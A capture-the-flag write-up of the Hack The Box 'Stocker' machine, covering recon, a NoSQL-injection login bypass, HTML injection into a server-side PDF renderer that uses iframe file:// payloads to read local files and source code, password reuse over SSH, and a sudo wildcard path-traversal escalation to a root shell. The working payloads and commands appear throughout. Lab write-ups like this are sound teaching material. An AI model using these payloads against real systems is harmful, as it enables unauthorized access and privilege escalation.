---
title: "HTB • Stocker"
tags:
  - "Linux"
  - "Web"
  - "Easy Difficulty"
  - "Path Traversal"
  - "Intermediate"
  - "NoSQL Injection"
  - "Sudo"
  - "JavaScript"
  - "API"
excerpt: "Stocker is an easy linux machine on Hack the Box that involves web enumeration and exploitation, NoSQL injection, Local file disclosure, password reuse, and exploiting sudo rules"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-stocker/"
---

Stocker is an easy linux machine created by [**JoshSH**](https://app.hackthebox.com/users/269501) on [**Hack the Box**](https://app.hackthebox.com/machines/Stocker) that involves exploiting a **NoSQL injection** flaw to bypass authentication on a secret VHOST. From there we abuse a special HTML rendering feature on the site's backend to read the app source code which contains the password for the user **angoose**. Once we log in as angoose via SSH, we discover that we have a special sudo exception assigned to our user. We are able to abuse this rule because of a wildcard that opens up the opportunity to run a NodeJS application under our control and cause unintended execution as **root**

## Initial Recon

Let's first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@red_team (bash)
rhost="10.10.11.196" # Target IP address
lhost="10.10.14.5" # Your VPN IP address
echo rhost=$rhost >> .env
echo lhost=$lhost >> .env
. ./.env && ctfscan $rhost
```
{:.nolineno}

The open TCP ports reported in the scan include:

| Port | Service | Product | Version                 |
|:-----|:--------|:--------|:------------------------|
| 22   | SSH     | OpenSSH | 8.2p1 Ubuntu 4ubuntu0.5 |
| 80   | HTTP    | nginx   | 1.18.0                  |

## Web

A standard HTTP request to port 80 triggers a redirection to <http://stocker.htb>.

### Virtual Hostnames

If we change the host header in our  request to **stocker.htb**, we receive an entirely different response. Let's check for additional VHOSTs used by the web server.

```bash
# bryan@red_team (bash)
ffuf -u "http://$rhost" -w ~/wordlist/subdomains-100k.txt -H Host:\ FUZZ.stocker.htb \
  -mc all -fr 'Location: http://stocker.htb'
```
{:.nolineno}

It looks like we get a different response when sending a request using the hostname **dev.stocker.htb**. We'll add these two VHOSTs to `/etc/hosts`{:.filepath} so we can easily access them from a browser.

```bash
# bryan@red_team (bash)
echo 'vhost=(stocker.htb dev.stocker.htb)' >> .env && . ./.env
echo $rhost\\t$vhost | sudo tee -a /etc/hosts
```
{:.nolineno}

Now we should be able to visit either **stocker.htb** or **dev.stocker.htb** in a browser session.

### Main Site

First we'll visit <http://stocker.htb/>

![Main site](stocker-index.png)

From what we can see on the home page, the site is lacking any dynamic endpoints. Let's use [WhatWeb](https://github.com/urbanadventurer/WhatWeb) to fingerprint any technologies in use.

```bash
# bryan@red_team (bash)
whatweb $vhost[1] --log-json logs/whatweb-stocker.json
```
{:.nolineno}

WhatWeb notices the string _Eleventy v2.0.0_, referring to a static site generator known as [Eleventy](https://github.com/11ty/eleventy). This is certainly a good indicator that the site is static.

### Dev Site

It looks like the dev site is using **Express** which is indicative of a **NodeJS** backend.

```bash
# bryan@red_team (bash)
whatweb $vhost[2] --log-json logs/whatweb-dev.json
```
{:.nolineno}

When we visit <http://dev.stocker.htb/> we are redirected to [/login](http://dev.stocker.htb/login).

![Dev login](dev-login.png)

#### Authentication Bypass

The presence of a login page probably means that the site uses a database solution like SQL or NoSQL. With this in mind, we'll capture a login request and manually check for injection vulnerabilities with [BurpSuite](https://portswigger.net/burp/communitydownload).

![Login request](burp-proxy.png)

The captured login request uses the parameters _username_ and _password_ in the request body. After some manual testing we conclude that these parameters are _probably_ not vulnerable to generic SQL injection. Since this web app likely has a NodeJS/Express backend, we must also consider using a JSON request body. Once we start sending some generic type juggling JSON payloads, we notice that an empty object `{}` in either field will trigger a server error while any other type passes fine.

> We can easily change the content type and request body format with the **Content Type Converter** extension for BurpSuite.
{:.prompt-tip}

```bash
# bryan@red_team (bash)
ct='Content-Type: application/json' # make sure the server processes the body as JSON
curl $vhost[2]/login -i -H $ct -d '{"username":{},"password":"pass"}' # HTTP 502
curl $vhost[2]/login -i -H $ct -d '{"username":"demo","password":{}}' # HTTP 502
```
{:.nolineno}

This reminds us of a popular **NoSQL injection** payload which uses JSON objects to bypass authentication. More reading on this topic [here](https://book.hacktricks.xyz/pentesting-web/nosql-injection)

```json
{"username":{"$ne":null},"password":{"$ne":null}}
```
{:.nolineno}

Sure enough, this payload triggers a response redirecting us to [/stock](http://dev.stocker.htb/stock) indicating that the bypass was successful.

```bash
# bryan@red_team (bash)
ct='Content-Type: application/json' # make sure the server processes the body as JSON
curl $vhost[2]/login -i -H $ct -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```
{:.nolineno}

#### Authenticated

Let's check out `/stock`{:.filepath} with the same *connect.sid* cookie.

![Dev site](dev-stock.png)

The site has a couple server-side features that we should investigate:
* Submit purchase
* View purchase order

##### Order Functionality

It looks like the server might trust the client to supply information regarding each item in the basket with a POST request to [/api/order](http://dev.stocker.htb/api/order).

```json
{
  "basket":[
    {
      "_id":"638f116eeb060210cbd83a8d",
      "title":"Cup",
      "description":"It's a red cup.",
      "image":"red-cup.jpg",
      "price":32,
      "currentStock":4,
      "__v":0,
      "amount":1
    }
  ]
}
```
{:.nolineno}

We also notice that the generated document uses some parameters supplied by the client in the order submission.

![Order document](document.png)

Let's examine the metadata of the order document with `exiftool` to get a better idea of how the document was generated.

```bash
# bryan@red_team (bash)
exiftool ./6493d469910ad890f7a7cea9.pdf
```
{:.nolineno}
>
```text
...
Creator     : Chromium
Producer    : Skia/PDF m108
...
```

Two fields are particularly interesting: _Creator_ and _Producer_. Based on the value of the _Creator_ field, we suspect that the document was created in an automated Chromium browser session. To test this theory, we enter a Chromium session of our own and print a random HTML page with the destination set to _Save as PDF_. On observation of our own document, we notice that the _Producer_ field includes a similar string to the order document: `Skia/PDF m.*`. This further supports our inference that the PDF is generated from a HTML document.

##### Document Processing Flaw

Since our input is rendered in Chromium on the server side, let's see if we can introduce our own HTML into the document via the _title_ parameter. We'll just try to add an underline to the word _demo_ to verify.

```json
{
  "basket":[
    {
      "_id":"638f116eeb060210cbd83a8d",
      "title":"<u>demo</u>",
      "price":32,
      "amount":1
    }
  ]
}
```
{:.nolineno}
![HTML injection](html-injection.png)

We can include our own HTML! This could mean that we can use the iframe element to read local files.

##### Local File Disclosure

Let's try to use an iframe to read `/etc/passwd`{:.filepath}.

```json
{
  "basket":[
    {
      "_id":"638f116eeb060210cbd83a8d",
      "title":"<iframe width=1000px height=1000px src=file:///etc/passwd></iframe>",
      "price":32,
      "amount":1
    }
  ]
}
```
![Local file read](file-read.png)

Great! We can read files under the current context.
We are also informed that there is one non-root console user named **angoose**.
Since we know that this is a NodeJS app, let's try to read the source code, looking for database credentials or other juicy info.
We'll start by locating the `package.json`{:.filepath} file which should be in the working directory or a parent directory.

```html
<iframe width=1000px height=1000px src=file:///proc/self/cwd/package.json></iframe>
```
{:.nolineno}

>
```json
{
  "name": "stocker",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "dev": "nodemon index.js"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "connect-mongo": "^4.6.0",
    "express": "^4.18.2",
    "express-session": "^1.17.3",
    "md5": "^2.3.0",
    "mongoose": "^6.7.5",
    "puppeteer": "^19.3.0"
  },
  "devDependencies": {
    "nodemon": "^2.0.20"
  }
}
```

The response refers to the main application file at `./index.js`{:.filepath}. Let's read that too.

```html
<iframe width=1000px height=1000px src=file:///proc/self/cwd/index.js></iframe>
```
{:.nolineno}

The file contains a hard-coded password for the MongoDB server: **IHeardPassphrasesArePrettySecure**. This also happens to be the password for the local user **angoose** which we can use via SSH.

```bash
# bryan@red_team (bash)
ssh "angoose@$rhost"
```
{:.nolineno}

## Local Privilege Escalation

We find that our current user has restricted sudo privileges with the `sudo -l` command.

>
```
User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

The use of a wildcard in this exception can be abused to run a node app outside of `/usr/local/scripts`{:.filepath}, perhaps in a writable directory like `/tmp`{:.filepath}. We'll use the directory traversal sequence `../`{:.filepath} to run a file under our control while still matching the regex in the sudo rule.

```bash
# angoose@stocker (bash)
tf=$(mktemp --suffix=.js)
echo 'require("child_process").spawn("sh",["-pi"],{stdio:"inherit"})' > $tf
sudo /usr/bin/node /usr/local/scripts/../../..$tf && rm -rf $tf
```
{:.nolineno}

This gets us an unrestricted system shell!